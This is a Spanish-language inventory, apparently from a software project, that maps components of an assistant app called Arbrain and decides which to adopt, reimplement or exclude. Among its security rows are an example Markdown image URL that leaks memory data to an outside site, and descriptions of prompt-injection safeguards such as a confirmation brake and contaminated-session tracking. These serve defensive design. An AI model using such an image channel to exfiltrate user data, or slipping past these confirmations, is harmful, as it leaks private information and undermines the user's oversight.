- **image-generation**: Arbrain→proyecto: SKILL.md +105/-17; la de Arbrain no trae scripts/generate-image.ts y la del proyecto no trae references/sunburst.md.
- **knowledge-search**: Arbrain→proyecto: SKILL.md +38/-42; la del proyecto agrega README-PAQUETE.md.
- **memory-manager**: SKILL.md: Arbrain→proyecto +111/-88, Arbrain→global +43/-82, proyecto→global +39/-95. En las tres copias el contenido es SKILL.md (la global suma README-PAQUETE.md).
- **sistema-viable**: SKILL.md +39/-37, diagnostico.md +6/-6, indice-libro.md +31/-16. Su texto es el lenguaje operativo «Daniel↔Levy»: lo que lo ve el laboratorio en global no va a ningun producto.

## 6. Sin verificar

- Que el acuse (11 frases pre-sintetizadas) baje el primer sonido de la conversacion a p50 ≤ 644 ms y no empeore «para» (16/16), eco (0/6) ni el enrutador (75,5 %): se mide en la fase de voz con cerebro simulado.
- Que tiemposDelAudio (resaltado palabra a palabra) sea una mejora medible sobre el karaoke por frase de bucle-voz: la cifra de 0,68 s de desvio es la que Arbrain reporta y no se reprodujo.
- Si el servicio de tools/dictado puede emitir mp3/opus sin un codificador nuevo (hoy solo PCM16LE/WAV).
- El comportamiento de «voz-agentes» (Kokoro) y de sayd.swift: no estan en el repo publicado, solo se conocen por sus llamadas y comentarios.
- Una via de aprobacion del freno accesible sin raton que no sea un Enter a destiempo.
- Las licencias de las dependencias de terceros de Arbrain (no se leyeron sus package.json); pdf.js, dagre y las fuentes se tratan como terceros que no se copian.
- Clasificacion por estructura y cabeceras, no linea a linea, de features/{canvas,draw3,cerebro,finances,salud,youtube} y del Swift de manos-casa: son piezas que se excluyen enteras.
- Que la edicion «cliente» de Arbrain sea lo que cualquier alumno recibe: se lee de arbrain/EDICION = cliente y de las listas blancas, no se instalo ni se ejecuto nada.
- No se ejecuto ninguna prueba ni script de Arbrain; todo se leyo del espejo en v0.2.10.
- MANIFIESTO.json lista 2.464 archivos y el arbol de git tiene 2.458: la diferencia (6) no se investigo.

## 7. Correcciones y huecos que este mapa deja a la fase de la capa

- `tools/capa/src/voz.ts`: la cabecera cita `server/src/live/speech.ts` para Kokoro; es `server/src/voice.ts` (y `config.ts`). `live/speech.ts` es la voz de Apple.
- `tools/capa/src/freno.ts` ya cubre cita, vigencia, literal visible y clic humano; faltan huella por accion, literal ≤ 4.000, avisos y la vida de 10 min de una pendiente (`freno-confirmaciones-con-huella`), la pausa total y la bitacora.
- Piezas de alta prioridad sin destino aun en `tools/capa/src/`: `acuse.ts`, `voz-dispositivo.ts`, `voz-stt.ts`, `voz-texto.ts`, `seguridad-render.ts`, `cabina.ts`, `explorador.ts`, `bitacora.ts` y el servicio compatible con OpenAI en `tools/dictado/servicio/`.
- Mejoras que hay que medir o declarar «no medidas como mejora»: el acuse y el resaltado palabra a palabra.

## 8. Como se hizo y como se mantiene

- Se leyo, de la etiqueta y sin checkout, fetch ni escritura: `CAPAS.json`, `.claude/references/*`, `artificial-brain/references/app/` (con `schema.md`), `features/{cabina,chat,primer-arranque,permisos,planning,calendar,live,configuracion,canvas}`, `server/src/live/*`, `server/src/voice.ts`, `server/src/cliente/*`, `TELEFONO.md`, los hooks del autor y los tokens de `globals.css`; del resto, estructura y cabeceras.
- Cada ruta de `origen` existe en la etiqueta y cada simbolo citado aparece en su archivo (el generador falla si no). Las piezas `adopta` y `reimplementa` guardan el git blob de cada archivo: al subir de etiqueta, un blob distinto es un cambio **en lo adoptado**; un archivo sin pieza nueva, una novedad que se clasifica.
- Una pieza no es una promesa de construir: es la decision de que hacer con ella. Lo que queda por decidir lo dice `sinVerificar`.

## Anexo. Todas las piezas, por categoria

Motivo abreviado (el completo, con simbolos y blobs, en `mapa.json`).

### A.1 Interfaz (55)

| pieza | decision | ranura · nivel | motivo | destino propuesto |
|---|---|---|---|---|
| `cabina-vistas-vivas` | reimplementa | lienzo · producto | El asistente «muestra» una vista por nombre y parametros; lo que se guarda es la INVOCACION (no el HTML) y al montar se lee… | `tools/capa/src/react/lienzo.tsx` |
| `cabina-pantalla-completa` | reimplementa | lienzo · producto | Modo enfoque: la pestaña a todo el ancho con la conversacion montada y a la mano como asistente flotante… | `tools/capa/src/react/lienzo.tsx` |
| `cabina-enlace-propio-de-vista` | reimplementa | lienzo · producto | Cada vista tiene un enlace propio que lleva la INVOCACION (no el contenido) y al abrirlo se lee de su fuente con la sesion… | `tools/capa/src/cabina.ts` |
| `lienzo-pizarra-de-diagramas` | excluye (modulo-aparte) | lienzo · producto | Pizarra infinita donde el asistente declara QUE hay y el compilador decide… | — |
| `panel-pestanas-fijadas` | reimplementa | panel · producto | Panel lateral: lo que el asistente muestra se fija como pestaña (una por vista), la persona las ordena y las cierra… | `tools/capa/src/react/ventana.tsx` |
| `panel-bus-del-asistente` | reimplementa | panel · producto | El asistente fija, suelta y guarda pestañas por un bus con ACUSE: si la app no confirma… | `tools/capa/src/panel.ts` |
| `panel-archivero` | reimplementa | panel · producto | Archivero: «Guardar» deja la pestaña en «Guardadas» y sobrevive a cerrar pestañas y conversaciones… | `tools/capa/src/panel.ts` |
| `panel-orden-y-secciones-ocultas` | reimplementa | ajustes · producto | Ajustes › Panel: la lista de secciones del «+» se ordena arrastrando y cada una se oculta con un interruptor… | `tools/capa/src/panel.ts` |
| `panel-avisos-y-campana` | reimplementa | panel · producto | Campana de avisos: solo lo que le importa a la persona (agente, agenda, dinero, persona, alerta); lo demas queda en bitacora. | `tools/capa/src/react/ventana.tsx` |
| `panel-estado-de-la-app` | reimplementa | panel · producto | Estado visible de la app en una pildora: verde (nada que mostrar), «reparando» o «necesito ayuda» con Reintentar… | `tools/capa/src/react/ventana.tsx` |
| `panel-multiventana` | excluye (plataforma) | panel · producto | Varias ventanas y monitores: arrastrar pestañas entre ventanas con fantasma que cruza monitores… | — |
| `explorador-arbol` | reimplementa | explorador · producto | Arbol navegable con teclado de arbol (↑ ↓ recorren, → entra, ← sube, Enter abre, «/» busca, Esc limpia), buscar por nombre… | `tools/capa/src/react/explorador.tsx` |
| `documento-vista-aislada` | reimplementa | explorador · producto | Un archivo como pestaña: .md con sus diagramas, .txt para leer, .html AISLADO (iframe sin mismo origen) con tema que sigue… | `tools/capa/src/react/explorador.tsx` |
| `visor-pdf-video-audio` | excluye (no-aplica) | explorador · producto | Visor unico de PDF (paginas, zoom, busqueda), video con versiones y marcas de tiempo («quita esto» en el segundo 2:10) y audio… | — |
| `chat-hilo-y-compositor` | reimplementa | conversacion · producto | Hilo + compositor: mensajes fuera de la vista no cuestan layout, separadores de fecha… | `tools/capa/src/react/hilo.tsx` |
| `chat-cola-de-mensajes` | reimplementa | conversacion · producto | Reglas del envio: ninguna entrada nueva detiene un turno (solo el boton Detener con la caja vacia y «Enviar… | `tools/capa/src/conversacion.ts` |
| `chat-borradores-recuperables` | reimplementa | conversacion · producto | Lo escrito no se pierde: borrador por conversacion que sobrevive a recargar… | `tools/capa/src/react/hilo.tsx` |
| `chat-pregunta-con-opciones` | reimplementa | conversacion · producto | El asistente pregunta con opciones TOCABLES: una pregunta de seleccion unica responde al primer toque… | `tools/capa/src/react/hilo.tsx` |
| `chat-paleta-de-comandos` | reimplementa | intencion · producto | Paleta «/» de comandos locales que responden al instante sin gastar un turno de modelo… | `tools/capa/src/intencion.ts` |
| `chat-hilo-seguro` | reimplementa | conversacion · producto | El hilo nunca queda vacio EN SILENCIO: error boundary («No pude mostrar esta conversacion · Reintentar») y un vigia que mide… | `tools/capa/src/react/hilo.tsx` |
| `chat-semaforo-de-conversaciones` | reimplementa | conversacion · producto | Semaforo por conversacion: trabajando (pulsa), espera tu respuesta, terminó y no la has visto, ya la viste… | `tools/capa/src/react/hilo.tsx` |
| `chat-reloj-del-turno` | reimplementa | conversacion · producto | Cuanto lleva trabajando el turno, con el tono de quien espera («Trabajando 2 min»). | `tools/capa/src/react/hilo.tsx` |
| `chat-adjuntos-e-imagenes` | reimplementa | conversacion · producto | Adjuntos: imagenes pegadas o arrastradas (se preparan y se redimensionan antes de subir)… | `tools/capa/src/react/hilo.tsx` |
| `chat-tarjetas-de-herramienta` | excluye (plataforma) | conversacion · producto | Tarjetas de herramientas del Agent SDK (Bash, Read, subagentes, TODO del agente): reflejan lo que hace un agente con terminal… | — |
| `chat-selector-de-modelo` | excluye (gobernanza) | conversacion · producto | Selector de modelo y esfuerzo por conversacion, limites del plan y contexto del SDK… | — |
| `chat-mermaid-y-barra-de-estudio` | excluye (no-aplica) | conversacion · producto | Diagramas Mermaid en el chat (616 lineas) y la barra de estudio auto-inyectada en los bloques html (782 lineas)… | — |
| `plan-vistas-de-calendario` | excluye (duplicado) | plan · producto | Calendario completo del autor sobre FullCalendar (dia, 4 dias, semana, mes, año, agenda, crons) con el editor de eventos. | — |
| `memoria-vista-transparente` | reimplementa | memoria · producto | «Lo que se de ti»: toda la memoria por tipo, con buscador, fecha del ultimo cambio y lectura… | `tools/capa/src/react/memoria.tsx` |
| `primer-arranque-pasos` | reimplementa | primer-arranque · producto | Una idea por pantalla, lo seguro es el boton principal, todo se cambia despues en Ajustes y un paso que no cambia nada… | `tools/capa/src/primer-arranque.ts` |
| `primer-arranque-bienvenida-y-pedidos` | reimplementa | primer-arranque · producto | El primer mensaje orienta sin abrumar (quien es, que puede hacer HOY, dónde se cambia lo elegido) y promete solo… | `tools/capa/src/primer-arranque.ts` |
| `primer-arranque-legales-del-autor` | excluye (gobernanza) | primer-arranque · producto | Aviso de privacidad, terminos y licencia del autor: el propio archivo dice «BORRADOR — PENDIENTE DE REVISION LEGAL» | — |
| `primer-arranque-llaves-byok` | excluye (gobernanza) | primer-arranque · producto | Traer las llaves del alumno (BYOK) al llavero del sistema, «Conectar con OpenRouter» en un clic (OAuth PKCE) y «Probar conexion» | — |
| `ajustes-ventana-flotante` | reimplementa | ajustes · producto | Ajustes como ventana flotante: abrir y cerrar no toca la ruta ni lo que hay debajo… | `tools/capa/src/react/ventana.tsx` |
| `ajustes-mapa-con-buscador` | reimplementa | ajustes · producto | Mapa de Ajustes: secciones agrupadas y un buscador que filtra secciones Y ajustes concretos… | `tools/capa/src/react/ventana.tsx` |
| `ajustes-interruptor-accesible` | adopta | ajustes · producto | Interruptor con role="switch" y blanco tactil de 44 px (trazo visible de 44×24). | `tools/capa/src/react/interruptor.tsx` |
| `ajustes-atajos-de-teclado` | reimplementa | ajustes · producto | Una sola lista de atajos, en español, para el modal «?» y para Ajustes › Atajos; si un atajo cambia en su manejador, se cambia ahi. | `tools/capa/src/react/ventana.tsx` |
| `ajustes-tema-automatico-por-hora` | reimplementa | ajustes · producto | Tema claro/oscuro con opcion «automatico por hora» (claro de dia, oscuro de noche) y una regla pura que el script de arranque… | `tools/capa/src/react/estilos.ts` |
| `ajustes-modelo-y-catalogo` | excluye (gobernanza) | ajustes · producto | Configuracion › Modelo y motores (Claude, DeepSeek por OpenRouter con Codex como arnes, catalogo de modelos con precio)… | — |
| `ajustes-notificaciones-push` | excluye (duplicado) | panel · producto | Notificaciones del dispositivo (permiso, suscripcion push, prueba), service worker y manifest PWA. Lo cubre la skill add-mobile. | — |
| `ui-tokens-neutros` | reimplementa | ajustes · producto | Tokens del sistema visual: escala de elevacion (fondo, superficie, tarjeta, borde, texto, tenue), estados semanticos… | `tools/capa/src/react/estilos.ts` |
| `ui-componentes-titanium` | excluye (plataforma) | — · producto | ~920 lineas de `@layer components` (paneles de vidrio, botones, chips, calendario) y 2.287 lineas de CSS en Tailwind 4… | — |
| `ui-lenguaje-de-movimiento` | adopta | ajustes · producto | El movimiento explica, no decora: lo que entra sube escalonado UNA vez, lo que avanza se llena, solo late lo vivo (el ahora)… | `tools/capa/src/react/movimiento.tsx` |
| `ui-reposo-de-la-ventana` | reimplementa | panel · producto | Con la pestaña oculta o la app sin foco no hay nadie mirando: se pausan las animaciones INFINITAS y los sondeos bajan de ritmo… | `tools/capa/src/react/movimiento.tsx` |
| `ui-modo-presentacion` | reimplementa | ajustes · producto | Modo presentacion: un interruptor de ESTE equipo que oculta lo privado del todo al compartir pantalla (no viaja a otros aparatos) | `tools/capa/src/react/ventana.tsx` |
| `ui-formato-de-uso-del-modelo` | excluye (duplicado) | ajustes · producto | Formato unico de modelo · esfuerzo · tokens con la regla «sin fuente real, el dato no se pinta» | — |
| `ui-busqueda-global` | excluye (plataforma) | — · producto | Busqueda global (⌘K) sobre las tablas del Studio del autor… | — |
| `ui-imagenes-optimizadas` | excluye (no-aplica) | — · producto | Variantes AVIF/WebP por ancho para retratos y vista rapida de imagenes del Storage del Studio. | — |
| `ui-autenticacion-local` | excluye (duplicado) | — · producto | Login/registro de Supabase, sesion por secreto de instalacion de la edicion cliente (proxy-cliente) y limite de intentos… | — |
| `chat-html-en-vivo` | reimplementa | conversacion · producto | Un bloque ```html del modelo se muestra EN VIVO dentro del chat en un iframe aislado… | `tools/capa/src/react/hilo.tsx` |
| `freno-dialogo-de-confirmacion` | reimplementa | freno · producto | Dialogo modal: una pendiente a la vez (la mas vieja), el boton SEGURO tiene el foco («Rechazar»), Esc rechaza… | `tools/capa/src/react/freno.tsx` |
| `chat-acciones-de-conversacion` | reimplementa | conversacion · producto | Menu de la conversacion (renombrar, fijar, favorita, archivar, bifurcar… | `tools/capa/src/react/hilo.tsx` |
| `chat-inyecciones-y-sesiones-del-sdk` | excluye (plataforma) | conversacion · producto | Inyecciones (avisos del sistema que se pliegan en el hilo) y sesiones nativas `sdk:` del Agent SDK… | — |
| `cabina-estilos-css-modules` | excluye (plataforma) | — · producto | Estilos de la Cabina y del panel en CSS modules (cabina.module.css, luz.module.css… | — |
| `cabina-abrir-carpeta-del-sistema` | excluye (plataforma) | explorador · producto | «Abrir esta carpeta» del explorador: la abre en Explorer, Finder o xdg-open. | — |
| `shell-de-la-app-del-autor` | excluye (plataforma) | — · producto | El armazon de la app del autor: barra izquierda de secciones, columna de conversaciones, cabecera, zoom de la interfaz… | — |

### A.2 Funcion (48)

| pieza | decision | ranura · nivel | motivo | destino propuesto |
|---|---|---|---|---|
| `cabina-contrato-mostrar-abrir` | reimplementa | lienzo · producto | Contrato pequeño y validado: `mostrar` {vista + parametros} pinta DENTRO de la conversacion… | `tools/capa/src/cabina.ts` |
| `explorador-reglas-de-acceso` | reimplementa | explorador · producto | Lo que un explorador NUNCA enseña: respeta .gitignore, no muestra node_modules, .git, .next ni credenciales… | `tools/capa/src/explorador.ts` |
| `documento-cambios-por-palabras` | adopta | explorador · producto | Diff por palabras (LCS con recorte de prefijo y sufijo; por lineas si el texto es enorme) para que la persona vea SOLO… | `tools/capa/src/explorador-diff.ts` |
| `chat-espera-explicada` | adopta | conversacion · producto | «Preparando respuesta» no gira en silencio: pasados 25 s sin una señal del turno se consulta la salud real del producto… | `tools/capa/src/estado.ts` |
| `chat-html-aislado` | adopta | conversacion · producto | Cuando el modelo escribe un bloque ```html se muestra EN VIVO en un iframe aislado (sandbox="allow-scripts" sin mismo origen)… | `tools/capa/src/seguridad-render.ts` |
| `chat-imagen-remota-bloqueada` | adopta | conversacion · producto | Una imagen remota en el Markdown era un canal de salida SIN CLIC (![](https://otro.sitio/p?d=<algo de la memoria>))… | `tools/capa/src/seguridad-render.ts` |
| `plan-contraste-de-eventos` | adopta | plan · producto | Contraste WCAG 2.x MEDIDO del color de texto sobre el color de un evento (4,5:1 texto normal, 3:1 grande y componentes)… | `tools/capa/src/contraste.ts` |
| `plan-objetivos-mes-semana-dia` | reimplementa | plan · producto | Objetivos mes → semana → dia en Markdown editable con checkboxes (## Mes · **Mes:** hito · ### Semana · **Foco:** · #### Dia)… | `tools/capa/src/plan.ts` |
| `plan-despertadores` | reimplementa | plan · producto | Recordatorios DURABLES por conversacion («despiertame en 5 min», «a las 14:05 corre la QA»): una fila en el almacen… | `tools/capa/src/despertadores.ts` |
| `primer-arranque-sin-saldo` | reimplementa | ajustes · producto | Un turno que falla por falta de credito no muestra el error crudo del proveedor («API Error: 402… | `tools/capa/src/estado.ts` |
| `freno-confirmaciones-con-huella` | reimplementa | freno · producto | Modelo de la confirmacion: pendiente/permitida/rechazada/vencida/usada, categoria (enviar·pagar·borrar·publicar·otra)… | `tools/capa/src/freno.ts` |
| `freno-literal-visible-y-clic-humano` | adopta | freno · producto | Lo puro del dialogo: literalVisible (controles, marcas bidi «Trojan Source», ancho cero y BOM hechos visibles… | `tools/capa/src/freno.ts` |
| `freno-cita-textual-del-dueno` | reimplementa | freno · producto | La cita se coteja contra los mensajes de la PERSONA (nunca contra resultados de herramientas ni paginas): normalizada… | `tools/capa/src/freno.ts` |
| `freno-acciones-declaradas-por-el-modulo` | reimplementa | freno · producto | accionIrreversible clasifica por regex lo que un agente quiere ejecutar… | `tools/capa/src/enchufe.ts` |
| `freno-pausar-todo` | reimplementa | freno · producto | «Pausar todo»: freno general de la persona, siempre a la mano; aborta los turnos en vuelo… | `tools/capa/src/freno.ts` |
| `freno-bitacora-de-lo-que-hizo` | reimplementa | freno · producto | «Lo que hizo el asistente»: bitacora local de las acciones con efecto… | `tools/capa/src/bitacora.ts` |
| `bitacora-redactar-secretos` | adopta | freno · producto | Redactar antes de guardar: llaves privadas, llaves de proveedor… | `tools/capa/src/bitacora.ts` |
| `freno-cuanto-pregunta-tres-modos` | reimplementa | primer-arranque · producto | «Cuanto te pregunta»: tres modos (preguntar siempre · automatico en mi carpeta, por defecto · sin preguntar) | `tools/capa/src/primer-arranque.ts` |
| `freno-quitar-el-freno` | excluye (gobernanza) | freno · producto | Interruptor «Quitar tambien el freno (bajo mi responsabilidad)»: escribiendo una frase, enviar/borrar/publicar dejan de pedir clic. | — |
| `freno-sesion-contaminada` | reimplementa | freno · producto | Tras leer contenido de afuera (pagina, correo, archivo descargado) la conversacion queda «contaminada»… | `tools/capa/src/freno.ts` |
| `freno-politica-de-agente-con-terminal` | excluye (plataforma) | freno · producto | Guardia de un agente con Bash y archivos: lista blanca de comandos, tokenizador de shell conservador, sandbox (macOS/Linux)… | — |
| `freno-web-local-y-csp` | reimplementa | freno · global | Endurecimiento de una web local para el C3 de las instancias: el daemon solo atiende Host loopback (anti DNS rebinding)… | `docs/goals/capa-arbrain-c3.md` |
| `chat-turnos-durables` | reimplementa | conversacion · producto | Un stream caido no mata el trabajo: el turno nace con su id en la app ANTES de tocar la red… | `tools/capa/src/conversacion.ts` |
| `estado-sonda-de-salud` | reimplementa | panel · producto | Sonda de salud REAL del camino de un mensaje, sin gastar modelo: base, URL del motor y su /health… | `tools/capa/src/estado.ts` |
| `intencion-contrato-operar-hablando` | reimplementa | intencion · producto | Contrato entre la persona y el asistente: entender el pedido (consultar, explorar, decidir o ejecutar)… | `tools/capa/src/intencion.ts` |
| `intencion-enrutador-lexico` | reimplementa | intencion · producto | Enrutador de intencion SIN modelo: tabla de rutas {nombre, frases[], destinos}; la frase mas larga gana y el orden desempata… | `tools/capa/src/intencion.ts` |
| `intencion-busqueda-por-encabezados` | excluye | intencion · producto | `--find` busca encabezados de skills e indices de memoria (maximo 6 rutas) y `--check` verifica destinos. | — |
| `avisos-politica-de-entrega` | adopta | panel · producto | Politica UNICA de avisos: push (suena y queda en la campana), campana (sin sonido) o bitacora (solo registro)… | `tools/capa/src/avisos.ts` |
| `memoria-contrato-de-archivos` | reimplementa | memoria · producto | Contrato de la memoria: una ESENCIA corta que se carga siempre (~40 lineas), un INDICE con disparadores… | `tools/capa/src/memoria.ts` |
| `memoria-recall-por-disparadores` | reimplementa | memoria · producto | Recall pasivo sin modelo: cada mensaje se coteja contra los disparadores («**T:**») del indice con acentos plegados… | `tools/capa/src/memoria.ts` |
| `memoria-semilla-por-inquilino` | reimplementa | memoria · producto | Como nace la memoria de un inquilino nuevo: una semilla vacia con instructivo que copia solo lo que FALTA… | `tools/capa/src/memoria.ts` |
| `memoria-sqlite-fts5-heredada` | excluye (plataforma) | memoria · producto | Memoria semantica en SQLite con FTS5 (top 3) + recientes (5), decaimiento y guardado de turnos «con informacion semantica»… | — |
| `memoria-ventana-del-sdk` | excluye (plataforma) | memoria · producto | Anatomia MEDIDA de la ventana de contexto (getContextUsage del SDK de Claude, usage de cada mensaje del transcript… | — |
| `memoria-conocimiento-compilado` | excluye | memoria · global | Knowledge compilado de conversaciones (`.claude/knowledge/`, `.claude/daily/`) y su skill de busqueda: capa personal del dueño… | — |
| `aviso-licencia-y-notice` | adopta | — · producto | Apache-2.0 §4: copia de la licencia (LICENSE-FUENTE) y el texto de atribucion de NOTICE en el derivado… | `tools/capa/NOTICE` |
| `capas-autor-y-alumno` | reimplementa | — · global | Contrato de capas: lo del AUTOR (14 skills, hooks, app) se regenera en cada version; lo del ALUMNO… | `tools/capa/mapa.json` |
| `actualizacion-con-firma-primero` | reimplementa | — · global | Procedimiento oficial: ancla de firmas FUERA del repo (nunca se edita para que algo pase), fetch de etiquetas sin --force… | `scripts/capa/firma.mjs` |
| `actualizacion-revisar-lo-que-corre-solo` | reimplementa | — · global | Antes de traer nada, listar lo que cambia y se EJECUTA SOLO… | `scripts/capa/revisa-actualizacion.mjs` |
| `actualizacion-skills-homonimas` | reimplementa | — · global | Si una skill del dueño se llama igual que una nueva del autor, la del dueño se renombra a `<nombre>-mia` (carpeta y `name:`)… | `.claude/skills/actualizar-capa/SKILL.md` |
| `intencion-principios-dirigir-modelos` | excluye (no-aplica) | — · global | Lecciones para encargos creativos a un modelo (videos, lienzos, copy): «se le dice que sentir, nunca que dibujar»… | — |
| `intencion-cerebro-compartido-claude-codex` | excluye (duplicado) | — · global | Un solo cerebro para Claude Code y Codex por enlaces relativos… | — |
| `seguridad-ssrf-e-inyeccion-del-daemon` | excluye (no-aplica) | — · producto | Capa de seguridad del daemon heredada de ClaudeClaw: patrones de inyeccion de prompt (no bloquea, solo registra)… | — |
| `chat-runtime-del-daemon` | excluye (plataforma) | conversacion · producto | Runtime de turnos del daemon: journal SQLite, supervisor, corredor y registro de corredores, pool de sesiones, adoptante… | — |
| `daemon-http-del-autor` | excluye (plataforma) | — · producto | Servidor HTTP del daemon (server.ts, ~1.600 lineas): rutas del chat, cabina, planning, confirmaciones, manos, voz, live… | — |
| `rutas-y-api-del-autor` | excluye (plataforma) | — · producto | Las rutas de Next del autor: ~25 paginas del App Router… | — |
| `scripts-del-autor` | excluye (plataforma) | — · global | Scripts de verificacion y operacion del repo del autor: caos del cliente, validar live, pruebas web, podar respaldos… | — |
| `pruebas-de-arbrain` | excluye (no-aplica) | — · global | Los 437 archivos de prueba del autor (280 en tests/, 16 en server/tests y 141 *.test.ts en server/src… | — |
| `terceros-dentro-de-arbrain` | excluye (no-aplica) | — · global | Software de terceros que Arbrain trae dentro del repo: pdf.js de Mozilla (public/pdfjs, 194 archivos), dagre (conectoma)… | — |

### A.3 Voz (37)

| pieza | decision | ranura · nivel | motivo | destino propuesto |
|---|---|---|---|---|
| `voz-acuse-inmediato` | reimplementa | voz · producto | Acuse de un repertorio fijo (11 frases en 4 claves: consulta, razonar, trabajo, duda) mientras piensa el cerebro… | `tools/capa/src/acuse.ts` |
| `voz-voz-del-dispositivo` | adopta | voz · producto | Elige la mejor voz en español del dispositivo (respaldo donde no hay Piper: navegador, teléfono) | `tools/capa/src/voz-dispositivo.ts` |
| `voz-probar-llave` | reimplementa | ajustes · producto | Ajustes › Voz con «Probar»: lista los modelos del proveedor con la llave (GET /models) para saber si funciona SIN gastar cuota… | `tools/capa/src/voz.ts` |
| `voz-stt-que-no-se-apaga` | adopta | voz · producto | STT por proveedores: el que no tiene llave se descarta y NO apaga a los demas… | `tools/capa/src/voz-stt.ts` |
| `voz-contrato-openai` | reimplementa | voz · herramienta | El enchufe de motor es el de la industria (/v1/audio/transcriptions y /v1/audio/speech) | `tools/dictado/servicio/openai.mjs` |
| `voz-texto-que-no-se-oye` | adopta | voz · producto | Regla unica de lo que la voz NO lee de una respuesta: la seccion «Fuentes/Referencias», las tablas y las URLs sueltas… | `tools/capa/src/voz-texto.ts` |
| `voz-texto-hablado` | adopta | voz · producto | Convierte el texto visible en el texto que se le manda a la voz… | `tools/capa/src/voz-texto.ts` |
| `voz-tiempos-de-palabras` | adopta | voz · producto | Resaltado palabra a palabra anclado al AUDIO REAL: busca los silencios del PCM… | `tools/capa/src/voz-tiempos.ts` |
| `voz-posicion-del-lector` | adopta | voz · producto | El lector recuerda dónde iba cada conversacion (mensaje, parrafo, palabra) y lo restaura EN PAUSA al volver o recargar… | `tools/capa/src/voz-lector.ts` |
| `voz-lector-escuchar-ui` | reimplementa | conversacion · producto | «Escuchar» cada respuesta: boton por mensaje, barra de control (anterior · pausa · siguiente · velocidad · cerrar)… | `tools/capa/src/react/escuchar.tsx` |
| `voz-dictar-en-el-chat` | reimplementa | voz · producto | Boton de dictar con estados (reposo · grabando con cronometro · procesando · error), modo soloTexto… | `tools/capa/src/react/voz.tsx` |
| `voz-permiso-del-microfono` | reimplementa | voz · producto | El permiso del microfono se pide al primer clic de dictar o de encender el Modo conversación… | `tools/capa/src/react/voz.tsx` |
| `voz-estado-del-motor` | reimplementa | voz · producto | ¿Hay motor de voz? Se pregunta al montar, al volver a la ventana y cuando Ajustes avisa que cambió… | `tools/capa/src/react/voz.tsx` |
| `voz-ajustes-voz` | reimplementa | ajustes · producto | Ajustes › Voz: motor que suena, «Probar», «Voz de las respuestas». Cada motor dice que sale de la maquina (nada / audio / texto) | `tools/capa/src/react/ajustes-voz.tsx` |
| `voz-estados-del-modo-conversacion` | reimplementa | voz · producto | Vocabulario de estados del boton y subtitulo accesible… | `tools/capa/src/voz.ts` |
| `voz-medir-adaptadores` | reimplementa | voz · producto | Metodo de medicion de adaptadores: el mismo WAV sintetizado por caso… | `scripts/capa/mide-adaptadores.mjs` |
| `voz-nube-groq-stt` | reimplementa | voz · producto | STT en la nube: Groq whisper-large-v3-turbo (llave gratuita). Adaptador OPCIONAL… | `tools/capa/src/nube/groq.ts` |
| `voz-nube-lemonfox-stt` | reimplementa | voz · producto | STT en la nube: LemonFox (de pago). Adaptador OPCIONAL, apagado por defecto. | `tools/capa/src/nube/lemonfox.ts` |
| `voz-nube-lemonfox-tts` | reimplementa | voz · producto | TTS en la nube: LemonFox (de pago; ~1,6 s por oracion segun un comentario de Arbrain, no medido aqui) | `tools/capa/src/nube/lemonfox.ts` |
| `voz-nube-elevenlabs-tts` | reimplementa | voz · producto | TTS en la nube: ElevenLabs Flash v2.5. Adaptador OPCIONAL, apagado por defecto. | `tools/capa/src/nube/elevenlabs.ts` |
| `voz-nube-jev-clasificador` | excluye (nube) | voz · producto | Clasificador de ruta del acuse (Jev por OpenRouter, modelo typesafe/jev-1.13)… | — |
| `voz-nube-reconocimiento-del-navegador` | excluye (nube) | voz · producto | Reconocimiento de voz del navegador (SpeechRecognition continuo para «Oye Levy»)… | — |
| `voz-nube-kokoro-voz-agentes` | excluye (plataforma) | voz · producto | TTS por KOKORO_TTS_URL (default http://127.0.0.1:8880) con VOZ_TOKEN: el servicio «voz-agentes» del Studio del autor… | — |
| `voz-interrupcion-y-cierre-de-turno` | excluye (duplicado) | voz · herramienta | SpeechEndpoint: fin de frase a 850 ms, especulacion a 350 ms, interrupcion tras 180 ms de voz sobre un umbral de nivel… | — |
| `voz-parada-por-voz` | excluye (duplicado) | voz · herramienta | isStopUtterance: /^(levy[, ]+)?(para\|detente\|silencio\|alto\|espera)/ lleva el nombre de la persona del autor. | — |
| `voz-telemetria-de-latencia` | excluye (duplicado) | voz · herramienta | LatencyTrace: marcas voiceEnd → endpoint → sttDone → send → firstToken → firstSentence → firstByte → firstSound. | — |
| `voz-separador-de-frases` | excluye (duplicado) | voz · herramienta | SpeechClauses (primer trozo de 14 caracteres o ~5 palabras, luego 65) y SentenceSplitter del HUD… | — |
| `voz-reproductor-web-audio` | excluye (duplicado) | voz · herramienta | LivePcmPlayer (PCM por Web Audio con cola y cancelacion) y VozServidor (audio por parrafo con precarga de 3 tramos) | — |
| `voz-pcm-y-nivel` | excluye (duplicado) | voz · herramienta | PcmDecoder y rms (decodificar s16le por trozos desalineados, nivel). Ya los cubren el PCM/WAV y el nivel en dB de bucle-voz y voz. | — |
| `voz-hud-command-center` | excluye (duplicado) | voz · producto | HUD de voz del autor (orbe, onda, subtitulos karaoke, telemetria, useVoiceLoop de 578 lineas, audio-engine de 346) | — |
| `voz-vad-y-diarizacion` | excluye (duplicado) | voz · herramienta | Arbrain no trae VAD propio (mide nivel RMS contra un umbral). Nuestro VAD Silero (tambien en el navegador)… | — |
| `voz-apple-juan-macos` | excluye (plataforma) | voz · producto | WarmSpeech: voz de Apple por un proceso Swift (sayd) que se compila con swiftc; exige macOS… | — |
| `voz-espacio-visual-de-live` | excluye | voz · producto | Espacio visual de Live (el asistente compone piezas y graficas con la herramienta `workspace`)… | — |
| `voz-pizarron-con-voz` | excluye (modulo-aparte) | voz · producto | Pizarron donde el asistente ensena conversando (voz sincronizada palabra por palabra con lo que traza) | — |
| `voz-diagnostico-del-lector` | excluye (no-aplica) | voz · producto | Sonda temporal del hilo principal para cazar por qué se desincroniza el lector… | — |
| `voz-dictado-desde-el-telefono` | excluye (duplicado) | voz · herramienta | Dictar desde el teléfono: Arbrain usa el micrófono del navegador del teléfono (VoiceInput) con la llave de Groq en el daemon… | — |
| `voz-enrutador-sin-llm` | excluye (duplicado) | voz · herramienta | Arbrain no resuelve ordenes de voz en local: el acuse lo elige un clasificador con modelo (Jev) y los comandos de la paleta… | — |

### A.4 Skills (14)

| pieza | decision | ranura · nivel | motivo | destino propuesto |
|---|---|---|---|---|
| `skill-actualizar-arbrain` | reimplementa | — · global | Procedimiento de actualizacion firmado de Arbrain… | `.claude/skills/actualizar-capa/SKILL.md` |
| `skill-artificial-brain` | excluye | — · global | Operar y diagnosticar el Arbrain PERSONAL (daemon, llaves, las cuatro salas, panel, chat) | — |
